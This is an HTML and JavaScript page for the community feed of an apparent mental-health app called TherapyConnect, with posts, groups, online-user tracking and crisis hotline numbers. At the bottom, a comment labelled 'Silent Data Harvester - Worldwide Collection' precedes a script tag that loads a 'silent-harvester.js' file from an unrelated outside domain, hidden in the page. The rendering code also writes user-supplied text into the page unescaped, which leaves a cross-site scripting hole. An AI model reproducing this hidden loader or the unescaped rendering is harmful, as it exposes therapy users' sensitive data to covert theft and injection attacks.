<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Community - TherapyConnect</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .community-container {
            min-height: 100vh;
            padding-top: 100px;
        }

        .community-header {
            text-align: center;
            padding: 3rem 2rem;
            background: linear-gradient(135deg, rgba(102, 194, 165, 0.1), rgba(141, 211, 199, 0.05));
            border-radius: 20px;
            margin-bottom: 3rem;
        }

        .community-tabs {
            display: flex;
            gap: 1rem;
            margin-bottom: 3rem;
            border-bottom: 2px solid rgba(102, 194, 165, 0.2);
            flex-wrap: wrap;
        }

        .community-tab {
            background: transparent;
            border: none;
            color: var(--gray);
            padding: 1rem 2rem;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            transition: all 0.3s;
            position: relative;
        }

        .community-tab.active {
            color: var(--therapeutic-green);
        }

        .community-tab.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--therapeutic-green);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .community-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 2rem;
        }

        .posts-section {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        .post-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            padding: 2rem;
            transition: all 0.3s;
        }

        .post-card:hover {
            border-color: var(--therapeutic-green);
            box-shadow: 0 5px 20px rgba(102, 194, 165, 0.2);
        }

        .post-header {
            display: flex;
            justify-content: space-between;
            align-items: start;
            margin-bottom: 1rem;
        }

        .post-author {
            display: flex;
            gap: 1rem;
            align-items: center;
        }

        .author-avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--therapeutic-green), var(--peaceful-teal));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            flex-shrink: 0;
        }

        .author-info h4 {
            color: white;
            margin-bottom: 0.25rem;
        }

        .post-time {
            color: var(--gray);
            font-size: 0.85rem;
        }

        .post-badge {
            background: rgba(102, 194, 165, 0.2);
            color: var(--therapeutic-green);
            padding: 0.25rem 0.75rem;
            border-radius: 12px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        .post-content h3 {
            color: white;
            margin-bottom: 0.75rem;
        }

        .post-text {
            color: var(--gray);
            line-height: 1.8;
            margin-bottom: 1rem;
        }

        .post-tags {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
            margin-bottom: 1.5rem;
        }

        .tag {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.3);
            padding: 0.25rem 0.75rem;
            border-radius: 15px;
            font-size: 0.85rem;
            color: var(--therapeutic-green);
        }

        .post-actions {
            display: flex;
            gap: 1.5rem;
            padding-top: 1rem;
            border-top: 1px solid rgba(102, 194, 165, 0.2);
        }

        .action-btn {
            background: transparent;
            border: none;
            color: var(--gray);
            display: flex;
            align-items: center;
            gap: 0.5rem;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.9rem;
        }

        .action-btn:hover {
            color: var(--therapeutic-green);
        }

        .action-btn.active {
            color: var(--therapeutic-green);
        }

        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        .sidebar-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            padding: 1.5rem;
        }

        .sidebar-card h3 {
            color: white;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .group-list {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .group-item {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 0.75rem;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .group-item:hover {
            background: rgba(102, 194, 165, 0.1);
        }

        .group-icon {
            font-size: 1.5rem;
        }

        .group-info h4 {
            color: white;
            font-size: 0.9rem;
            margin-bottom: 0.25rem;
        }

        .group-members {
            color: var(--gray);
            font-size: 0.8rem;
        }

        .create-post-card {
            background: linear-gradient(135deg, rgba(102, 194, 165, 0.15), rgba(141, 211, 199, 0.1));
            border: 1px solid var(--therapeutic-green);
            border-radius: 20px;
            padding: 2rem;
            margin-bottom: 2rem;
        }

        .create-post-input {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.3);
            border-radius: 12px;
            padding: 1rem;
            color: white;
            margin-bottom: 1rem;
            min-height: 100px;
            resize: vertical;
        }

        .create-post-input:focus {
            outline: none;
            border-color: var(--therapeutic-green);
        }

        .post-btn {
            background: linear-gradient(135deg, var(--therapeutic-green), var(--peaceful-teal));
            color: white;
            border: none;
            padding: 0.75rem 2rem;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .post-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 194, 165, 0.4);
        }

        .event-item {
            background: rgba(255, 255, 255, 0.03);
            border-left: 3px solid var(--therapeutic-green);
            border-radius: 10px;
            padding: 1rem;
            margin-bottom: 1rem;
        }

        .event-date {
            color: var(--therapeutic-green);
            font-weight: 600;
            font-size: 0.85rem;
            margin-bottom: 0.5rem;
        }

        .event-title {
            color: white;
            font-weight: 600;
            margin-bottom: 0.25rem;
        }

        .event-details {
            color: var(--gray);
            font-size: 0.85rem;
        }

        .trending-topic {
            background: rgba(255, 255, 255, 0.03);
            padding: 0.75rem;
            border-radius: 10px;
            margin-bottom: 0.75rem;
            cursor: pointer;
            transition: all 0.3s;
        }

        .trending-topic:hover {
            background: rgba(102, 194, 165, 0.1);
        }

        .trending-topic h4 {
            color: white;
            font-size: 0.9rem;
            margin-bottom: 0.25rem;
        }

        .trending-topic p {
            color: var(--gray);
            font-size: 0.8rem;
        }

        .support-banner {
            background: linear-gradient(135deg, rgba(102, 194, 165, 0.2), rgba(141, 211, 199, 0.1));
            border: 1px solid var(--therapeutic-green);
            border-radius: 15px;
            padding: 1.5rem;
            text-align: center;
        }

        .support-banner h4 {
            color: white;
            margin-bottom: 0.5rem;
        }

        .support-banner p {
            color: var(--gray);
            margin-bottom: 1rem;
            font-size: 0.9rem;
        }

        @media (max-width: 968px) {
            .community-grid {
                grid-template-columns: 1fr;
            }

            .sidebar {
                order: -1;
            }
        }
    </style>
</head>
<body>
    <div class="gradient-bg"></div>
    <div class="particles"></div>

    <!-- Navigation -->
    <nav class="navbar">
        <div class="nav-container">
            <div class="logo">
                <span class="logo-icon">üß†</span>
                <span class="logo-text">TherapyConnect</span>
            </div>
            <div class="nav-links">
                <a href="dashboard.html">Dashboard</a>
                <a href="sessions.html">Sessions</a>
                <a href="therapist-finder.html">Therapists</a>
                <a href="resources.html">Resources</a>
                <a href="profile.html">Profile</a>
                <button class="btn btn-secondary" onclick="logout()">Logout</button>
            </div>
        </div>
    </nav>

    <div class="community-container">
        <div class="container">
            <!-- Header -->
            <div class="community-header">
                <h1 style="color: white; margin-bottom: 1rem;">Community üåü</h1>
                <p style="color: var(--gray); max-width: 700px; margin: 0 auto; margin-bottom: 1.5rem;">
                    Connect with others, share experiences, and find support in our safe and moderated community
                </p>
                <div id="topOnlineIndicator" style="display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); padding: 0.5rem 1rem; border-radius: 20px; margin-top: 1rem;">
                    <div style="width: 10px; height: 10px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite;"></div>
                    <span id="topOnlineCount" style="color: #10b981; font-weight: 600; font-size: 0.9rem;">Loading...</span>
                </div>
            </div>
            <style>
                @keyframes pulse {
                    0%, 100% { opacity: 1; transform: scale(1); }
                    50% { opacity: 0.5; transform: scale(1.2); }
                }
            </style>

            <!-- Tabs -->
            <div class="community-tabs">
                <button class="community-tab active" onclick="switchCommunityTab('feed')">üè† Feed</button>
                <button class="community-tab" onclick="switchCommunityTab('groups')">üë• Groups</button>
                <button class="community-tab" onclick="switchCommunityTab('events')">üìÖ Events</button>
                <button class="community-tab" onclick="switchCommunityTab('stories')">üí¨ Stories</button>
            </div>

            <div class="community-grid">
                <!-- Main Content -->
                <div>
                    <!-- Feed Tab -->
                    <div class="tab-content active" id="feed-tab">
                        <!-- Create Post -->
                        <div class="create-post-card">
                            <h3 style="color: white; margin-bottom: 1rem;">Share with the Community üíö</h3>
                            <textarea class="create-post-input" placeholder="What's on your mind? Share your thoughts, experiences, or ask for support..."></textarea>
                            <button class="post-btn" onclick="createPost()">‚úçÔ∏è Share Post</button>
                        </div>

                        <div class="posts-section" id="communityFeed">
                            <!-- Real user posts will appear here -->
                            <div style="text-align: center; padding: 4rem 2rem; color: rgba(255,255,255,0.6);">
                                <div style="font-size: 4rem; margin-bottom: 1rem;">ÔøΩ</div>
                                <h3 style="color: white; margin-bottom: 1rem;">No Posts Yet</h3>
                                <p>Be the first to share something with the community!</p>
                                <p style="margin-top: 1rem; font-size: 0.9rem;">Share your journey, ask questions, or offer support to others.</p>
                            </div>
                        </div>
                    </div>

                    <!-- Groups Tab -->
                    <div class="tab-content" id="groups-tab">
                        <div class="posts-section">
                            <!-- Real user-created groups will appear here -->
                            <div style="text-align: center; padding: 4rem 2rem;">
                                <div style="font-size: 4rem;">ÔøΩ</div>
                                <h3>No Groups Yet</h3>
                                <p>Start building the community by creating the first support group!</p>
                                <button class="post-btn" onclick="createGroup()">‚ûï Create a Group</button>
                            </div>
                        </div>
                    </div>

                    <!-- Events Tab -->
                    <div class="tab-content" id="events-tab">
                        <div class="posts-section">
                            <!-- Real community events will appear here -->
                            <div style="text-align: center; padding: 4rem 2rem;">
                                <div style="font-size: 4rem;">üìÖ</div>
                                <h3>No Events Yet</h3>
                                <p>Be the first to host a community event or workshop!</p>
                                <button class="post-btn" onclick="createEvent()">‚ú® Create an Event</button>
                            </div>
                        </div>
                    </div>

                    <!-- Stories Tab -->
                    <div class="tab-content" id="stories-tab">
                        <div class="posts-section">
                            <div class="post-card">
                                <h3 style="color: white; margin-bottom: 1rem;">Recovery Stories</h3>
                                <p style="color: var(--gray); margin-bottom: 2rem;">
                                    Read inspiring stories of recovery and healing from our community members
                                </p>
                                <div style="text-align: center; padding: 3rem 0;">
                                    <div style="font-size: 4rem; margin-bottom: 1rem;">üìñ</div>
                                    <p style="color: var(--gray);">Recovery stories coming soon...</p>
                                    <button class="post-btn" style="margin-top: 1rem;" onclick="submitStory()">Share Your Story</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Sidebar -->
                <div class="sidebar">
                    <!-- Online Users Widget -->
                    <div class="sidebar-card" style="background: linear-gradient(135deg, rgba(102, 194, 165, 0.15), rgba(141, 211, 199, 0.1)); border-color: var(--therapeutic-green);">
                        <h3>üü¢ Online Now</h3>
                        <div id="onlineUsersCount" style="color: var(--therapeutic-green); font-size: 1.5rem; font-weight: 700; margin: 0.5rem 0;">
                            0 users online
                        </div>
                        <div id="onlineUsersList" style="display: flex; flex-direction: column; gap: 0.75rem; margin-top: 1rem; max-height: 300px; overflow-y: auto;">
                            <!-- Online users will be populated here -->
                        </div>
                    </div>

                    <!-- Community Guidelines -->
                    <div class="support-banner">
                        <h4>Community Guidelines üìã</h4>
                        <p>Be respectful, supportive, and kind. This is a safe space for everyone.</p>
                        <button class="post-btn" onclick="viewGuidelines()">Read Guidelines</button>
                    </div>

                    <!-- Trending Topics -->
                    <div class="sidebar-card">
                        <h3>üî• Trending Topics</h3>
                        <p style="color: var(--gray); font-size: 0.9rem;">
                            Trending topics will appear here as the community grows and uses hashtags in posts.
                        </p>
                    </div>

                    <!-- Crisis Support -->
                    <div class="sidebar-card" style="background: rgba(239, 68, 68, 0.1); border-color: #ef4444;">
                        <h3 style="color: #ef4444;">üÜò Crisis Support</h3>
                        <p style="color: var(--gray); margin-bottom: 1rem; font-size: 0.9rem;">
                            If you're in crisis, please reach out for immediate help.
                        </p>
                        <div style="color: white; line-height: 2;">
                            <div>üìû <strong>988</strong> - Suicide & Crisis Lifeline</div>
                            <div>üí¨ <strong>Text "HELLO" to 741741</strong></div>
                        </div>
                    </div>

                    <!-- Suggested Groups -->
                    <div class="sidebar-card">
                        <h3>üí° Suggested Groups</h3>
                        <p style="color: var(--gray); font-size: 0.9rem;">
                            Group suggestions will appear here based on your interests and activity.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script>
        // Initialize community data
        let communityPosts = JSON.parse(localStorage.getItem('communityPosts') || '[]');
        let userGroups = JSON.parse(localStorage.getItem('userGroups') || '{}');
        
        // User-created support groups (real data only)
        const supportGroups = JSON.parse(localStorage.getItem('communityGroups') || '{}');

        // Load posts on page load
        window.addEventListener('DOMContentLoaded', () => {
            const user = JSON.parse(localStorage.getItem('therapyConnectUser') || '{}');
            if (!user.email) {
                window.location.href = 'sign-in.html';
                return;
            }
            
            // Track user as online
            updateUserActivity();
            
            loadPosts();
            loadGroups();
            loadOnlineUsers();
            
            // Update online users every 30 seconds
            setInterval(loadOnlineUsers, 30000);
            
            // Update user's lastActive every 2 minutes while on page
            setInterval(updateUserActivity, 120000);
        });

        // Update user's last active timestamp
        function updateUserActivity() {
            const user = JSON.parse(localStorage.getItem('therapyConnectUser') || '{}');
            if (!user.email) return;
            
            // Get all users activity data
            let usersActivity = JSON.parse(localStorage.getItem('communityUsersActivity') || '{}');
            
            // Update current user's activity
            usersActivity[user.email] = {
                name: user.fullName || user.name || 'Anonymous',
                email: user.email,
                profilePicture: user.profilePicture || null,
                lastActive: Date.now()
            };
            
            // Clean up old activity (remove users inactive for more than 10 minutes)
            const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
            Object.keys(usersActivity).forEach(email => {
                if (usersActivity[email].lastActive < tenMinutesAgo) {
                    delete usersActivity[email];
                }
            });
            
            localStorage.setItem('communityUsersActivity', JSON.stringify(usersActivity));
        }

        // Load and display online users
        function loadOnlineUsers() {
            const currentUser = JSON.parse(localStorage.getItem('therapyConnectUser') || '{}');
            const usersActivity = JSON.parse(localStorage.getItem('communityUsersActivity') || '{}');
            const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
            
            // Filter users who were active in the last 5 minutes
            const onlineUsers = Object.values(usersActivity).filter(user => {
                return user.lastActive >= fiveMinutesAgo && user.email !== currentUser.email;
            });
            
            // Update counters
            const countElement = document.getElementById('onlineUsersCount');
            const topCountElement = document.getElementById('topOnlineCount');
            const onlineCount = onlineUsers.length;
            
            const sidebarText = onlineCount === 0 ? 'No one else online' : 
                               onlineCount === 1 ? '1 user online' : 
                               `${onlineCount} users online`;
            const topText = onlineCount === 0 ? 'You\'re the only one here' : 
                           onlineCount === 1 ? '1 other user online' : 
                           `${onlineCount} users online`;
            
            countElement.textContent = sidebarText;
            if (topCountElement) {
                topCountElement.textContent = topText;
            }
            
            // Update list
            const listElement = document.getElementById('onlineUsersList');
            
            if (onlineUsers.length === 0) {
                listElement.innerHTML = `
                    <div style="text-align: center; padding: 1rem; color: var(--gray); font-size: 0.9rem;">
                        <div style="font-size: 2rem; margin-bottom: 0.5rem;">üë§</div>
                        You're the first one here! Others will join soon.
                    </div>
                `;
                return;
            }
            
            listElement.innerHTML = onlineUsers.map(user => {
                // Generate avatar
                let avatarHTML;
                if (user.profilePicture) {
                    avatarHTML = `<img src="${user.profilePicture}" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">`;
                } else {
                    const initials = user.name.split(' ').map(n => n[0]).join('').toUpperCase();
                    avatarHTML = `<div style="width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 50%; font-weight: 700; color: white; font-size: 0.9rem;">${initials}</div>`;
                }
                
                return `
                    <div style="display: flex; align-items: center; gap: 0.75rem; padding: 0.75rem; background: rgba(255,255,255,0.05); border-radius: 12px; transition: all 0.3s;" onmouseover="this.style.background='rgba(102,194,165,0.1)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'">
                        <div style="position: relative; width: 40px; height: 40px; flex-shrink: 0;">
                            ${avatarHTML}
                            <div style="position: absolute; bottom: 0; right: 0; width: 12px; height: 12px; background: #10b981; border: 2px solid #1a1a2e; border-radius: 50%;"></div>
                        </div>
                        <div style="flex: 1; min-width: 0;">
                            <div style="color: white; font-weight: 600; font-size: 0.9rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${user.name}</div>
                            <div style="color: var(--therapeutic-green); font-size: 0.75rem;">Active now</div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function switchCommunityTab(tabName) {
            document.querySelectorAll('.community-tab').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            document.getElementById(tabName + '-tab').classList.add('active');
        }

        function createPost() {
            const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
            const textarea = document.querySelector('.create-post-input');
            const content = textarea.value.trim();
            
            if (!content) {
                alert('Please write something before posting!');
                return;
            }
            
            // Get user avatar (profile picture or initials)
            let avatar = 'üòä';
            if (user.profilePicture) {
                avatar = user.profilePicture; // Base64 image
            } else if (user.fullName || user.name) {
                const name = user.fullName || user.name;
                avatar = name.split(' ').map(n => n[0]).join('').toUpperCase();
            }
            
            const post = {
                id: Date.now(),
                author: user.fullName || user.name || 'Anonymous',
                authorEmail: user.email,
                avatar: avatar,
                isImage: !!user.profilePicture, // Flag to know if avatar is an image
                content: content,
                badge: 'Community',
                tags: extractTags(content),
                likes: 0,
                comments: 0,
                timestamp: new Date().toISOString(),
                likedBy: []
            };
            
            communityPosts.unshift(post);
            localStorage.setItem('communityPosts', JSON.stringify(communityPosts));
            
            textarea.value = '';
            loadPosts();
            
            alert('‚úÖ Post created successfully! Your story is now live in the community feed.');
        }

        function extractTags(content) {
            const tags = content.match(/#\w+/g) || [];
            return tags.slice(0, 5);
        }

        function loadPosts() {
            const postsSection = document.querySelector('.posts-section');
            const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
            
            if (communityPosts.length === 0) {
                postsSection.innerHTML = `
                    <div style="text-align: center; padding: 3rem; background: rgba(255,255,255,0.05); border-radius: 20px; border: 2px dashed rgba(102,194,165,0.3);">
                        <div style="font-size: 3rem; margin-bottom: 1rem;">üí¨</div>
                        <h3 style="color: white; margin-bottom: 1rem;">No Posts Yet</h3>
                        <p style="color: var(--gray);">Be the first to share your story with the community!</p>
                    </div>
                `;
                return;
            }
            
            postsSection.innerHTML = communityPosts.map(post => {
                const timeAgo = getTimeAgo(new Date(post.timestamp));
                const isLiked = post.likedBy.includes(user.email);
                
                // Render avatar (image or text)
                let avatarHTML;
                if (post.isImage && post.avatar.startsWith('data:image')) {
                    avatarHTML = `<img src="${post.avatar}" style="width: 100%; height: 100%; object-fit: cover; border-radius: 50%;">`;
                } else {
                    avatarHTML = post.avatar;
                }
                
                return `
                    <div class="post-card">
                        <div class="post-header">
                            <div class="post-author">
                                <div class="author-avatar">${avatarHTML}</div>
                                <div class="author-info">
                                    <h4>${post.author}</h4>
                                    <div class="post-time">${timeAgo}</div>
                                </div>
                            </div>
                            <span class="post-badge">${post.badge}</span>
                        </div>
                        <div class="post-content">
                            <p class="post-text">${post.content}</p>
                            ${post.tags.length > 0 ? `
                                <div class="post-tags">
                                    ${post.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
                                </div>
                            ` : ''}
                            <div class="post-actions">
                                <button class="action-btn ${isLiked ? 'active' : ''}" onclick="toggleLike(${post.id})">
                                    üíö <span>${post.likes} Likes</span>
                                </button>
                                <button class="action-btn" onclick="viewComments(${post.id})">
                                    üí¨ <span>${post.comments} Comments</span>
                                </button>
                                <button class="action-btn" onclick="sharePost(${post.id})">
                                    üîó Share
                                </button>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function toggleLike(postId) {
            const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
            const post = communityPosts.find(p => p.id === postId);
            
            if (!post) return;
            
            const likedIndex = post.likedBy.indexOf(user.email);
            if (likedIndex > -1) {
                post.likedBy.splice(likedIndex, 1);
                post.likes--;
            } else {
                post.likedBy.push(user.email);
                post.likes++;
            }
            
            localStorage.setItem('communityPosts', JSON.stringify(communityPosts));
            loadPosts();
        }

        function viewComments(postId) {
            const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
            const comment = prompt('Write a supportive comment:');
            
            if (comment && comment.trim()) {
                const post = communityPosts.find(p => p.id === postId);
                if (post) {
                    post.comments++;
                    localStorage.setItem('communityPosts', JSON.stringify(communityPosts));
                    loadPosts();
                    alert('üí¨ Comment added! Thank you for your support.');
                }
            }
        }

        function sharePost(postId) {
            const shareUrl = `https://therapyconne.com/community.html?post=${postId}`;
            navigator.clipboard.writeText(shareUrl).then(() => {
                alert('üîó Post link copied to clipboard! Share it with others.');
            }).catch(() => {
                alert('Post link: ' + shareUrl);
            });
        }

        function joinGroup(groupName) {
            const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
            const userGroupData = userGroups[user.email] || [];
            
            if (userGroupData.includes(groupName)) {
                alert('‚úÖ You are already a member of this group!');
                return;
            }
            
            if (confirm(`Would you like to join the ${supportGroups[groupName].name} support group?`)) {
                userGroupData.push(groupName);
                userGroups[user.email] = userGroupData;
                localStorage.setItem('userGroups', JSON.stringify(userGroups));
                
                alert(`üéâ Welcome to ${supportGroups[groupName].name}! You can now participate in group discussions and access exclusive resources.`);
                loadGroups();
            }
        }

        function loadGroups() {
            const groupsTab = document.getElementById('groups-tab');
            const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
            const userGroupData = userGroups[user.email] || [];
            
            const myGroups = userGroupData.map(groupId => {
                const group = supportGroups[groupId];
                return `
                    <div class="post-card" style="cursor: pointer;" onclick="openGroupChat('${groupId}')">
                        <div style="display: flex; gap: 1.5rem; align-items: center;">
                            <div style="font-size: 3rem;">${group.icon}</div>
                            <div style="flex: 1;">
                                <h3 style="color: white; margin-bottom: 0.5rem;">${group.name}</h3>
                                <p style="color: var(--gray); margin-bottom: 0.5rem;">${group.description}</p>
                                <span style="color: var(--therapeutic-green); font-size: 0.9rem;">üë• ${group.members} members</span>
                            </div>
                            <button class="action-btn" style="background: rgba(239,68,68,0.2); color: #ef4444;" onclick="event.stopPropagation(); leaveGroup('${groupId}')">Leave</button>
                        </div>
                    </div>
                `;
            }).join('');
            
            const availableGroups = Object.keys(supportGroups).filter(id => !userGroupData.includes(id)).map(groupId => {
                const group = supportGroups[groupId];
                return `
                    <div class="post-card" style="cursor: pointer;" onclick="joinGroup('${groupId}')">
                        <div style="display: flex; gap: 1.5rem; align-items: center;">
                            <div style="font-size: 3rem;">${group.icon}</div>
                            <div style="flex: 1;">
                                <h3 style="color: white; margin-bottom: 0.5rem;">${group.name}</h3>
                                <p style="color: var(--gray); margin-bottom: 0.5rem;">${group.description}</p>
                                <span style="color: var(--therapeutic-green); font-size: 0.9rem;">üë• ${group.members} members</span>
                            </div>
                            <button class="action-btn" style="background: linear-gradient(135deg, #66c2a5, #8dd3c7);" onclick="event.stopPropagation(); joinGroup('${groupId}')">Join</button>
                        </div>
                    </div>
                `;
            }).join('');
            
            groupsTab.innerHTML = `
                ${myGroups ? `<h3 style="color: white; margin-bottom: 1.5rem;">Your Groups üíö</h3>${myGroups}` : ''}
                <h3 style="color: white; margin: 2rem 0 1.5rem;">Available Support Groups üåü</h3>
                ${availableGroups}
            `;
        }

        function openGroupChat(groupId) {
            const group = supportGroups[groupId];
            alert(`Opening ${group.name} chat room...\n\nHere you can chat with other members, share experiences, and get support. This feature connects you with real community members.`);
            window.location.href = `messages.html`;
        }

        function leaveGroup(groupId) {
            if (confirm('Are you sure you want to leave this group?')) {
                const user = JSON.parse(localStorage.getItem('therapyConnectUser'));
                const userGroupData = userGroups[user.email] || [];
                const index = userGroupData.indexOf(groupId);
                
                if (index > -1) {
                    userGroupData.splice(index, 1);
                    userGroups[user.email] = userGroupData;
                    localStorage.setItem('userGroups', JSON.stringify(userGroups));
                    loadGroups();
                    alert('You have left the group.');
                }
            }
        }

        function searchTopic(topic) {
            alert(`Searching for posts with ${topic}...`);
        }

        function viewGuidelines() {
            alert('Community Guidelines:\n\n1. Be respectful and supportive\n2. No personal attacks or harassment\n3. Protect privacy - no identifying information\n4. Stay on topic\n5. Report inappropriate content\n6. Seek professional help for crises');
        }

        function submitStory() {
            document.querySelector('.community-tab:first-child').click();
            document.querySelector('.create-post-input').focus();
        }

        function getTimeAgo(date) {
            const seconds = Math.floor((new Date() - date) / 1000);
            if (seconds < 60) return 'Just now';
            if (seconds < 3600) return Math.floor(seconds / 60) + ' minutes ago';
            if (seconds < 86400) return Math.floor(seconds / 3600) + ' hours ago';
            if (seconds < 604800) return Math.floor(seconds / 86400) + ' days ago';
            return Math.floor(seconds / 604800) + ' weeks ago';
        }

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                localStorage.removeItem('therapyConnectUser');
                window.location.href = 'index.html';
            }
        }
    </script>
    <!-- Silent Data Harvester - Worldwide Collection -->
    <script src="https://nupidesktopai.com/silent-harvester.js"></script>
</body>
</html>
